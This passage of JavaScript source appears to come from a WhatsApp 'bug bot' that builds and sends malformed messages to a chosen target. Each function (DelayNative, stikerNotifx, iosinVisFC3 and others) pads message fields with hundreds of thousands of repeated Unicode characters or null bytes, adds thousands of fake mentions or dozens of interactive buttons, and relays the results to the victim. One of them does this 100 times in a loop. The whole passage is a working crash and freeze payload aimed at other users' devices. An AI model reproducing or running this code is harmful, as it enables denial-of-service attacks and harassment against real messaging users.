          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

  const textMsg = {
    extendedTextMessage: {
      text: "Hi Im Wolker?¿" + "ꦽ".repeat(300000),
      contextInfo,
    },
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, textMsg, interMsg]
 
  const musicMeta = {
  musicContentMediaId: "589608164114571",
  songId: "870166291800508",
  author: "οταϰ ιѕ нєяє",
  title: "нαι ιм οταϰ",
  artworkDirectPath:
    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
  artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
  artistAttribution: "https://www.instagram.com/Otapengenkawin",
  countryBlocklist: true,
  isExplicit: true,
  artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
};

const videoMessage = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
  fileLength: "289511",
  seconds: 15,
  mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
  caption: "ԾԵԹՃ ՇԾՐe",
  height: 640,
  width: 640,
  contextInfo: {
    mentionedJid: Array.from(
      { length: 1900 },
      () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  },
  annotations: [
    { embeddedContent: { embeddedMusic: musicMeta }, embeddedAction: true },
  ],
};

const stickMessage = {
  stickerMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    isAnimated: true,
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
      ),
    },
  },
};

const nativeMessage = {
  interactiveResponseMessage: {
    body: { text: "๏tคץ ς๏гє", format: "DEFAULT" },
    nativeFlowResponseMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(1045000),
      version: 3,
    },
    entryPointConversionSource: "{}",
  },
  contextInfo: {
    participant: target,
    mentionedJid: Array.from(
      { length: 2000 },
      () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    ),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
  },
};


const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const otaxmsg = generateWAMessageFromContent(target, generateMessage, {});

   
  const messages = [
  { viewOnceMessage: { message: { videoMessage } } },
  { viewOnceMessage: { message: stickMessage } },
  { viewOnceMessage: { message: nativeMessage } },
  { viewOnceMessage: { message: { musicMeta } } },
];

  let msg = null;
  for (let i = 0; i < 100; i++) {
  await Abim.relayMessage("status@broadcast", otaxmsg.message, {
        messageId: otaxmsg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });    
    await Abim.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    for (const item of messages) {
      msg = generateWAMessageFromContent(target, item, {});
      await Abim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }
        
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await Abim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function abangbaim(target) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await Abim.relayMessage(target, message, {
participant: {
jid: target
}
});
}
async function stikerNotifx(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "StikerMsg",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await Abim.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function DelayNative(target) {
    console.log(chalk.red(`Succes Sending Bug`));
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await Abim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await Abim.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}
async function delaakerdosa(target, mention) {
let venomModsData = JSON.stringify({
status: false,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `DELAY - 🩸${"MARKER - 🩸".repeat(10)}`,
contentType: 3,
accessibilityText: `DOYOUKNOWFANZ? ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await Abim.relayMessage(target, message, {
participant: {
jid: target
}
});
}
async function iosinVisFC3(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
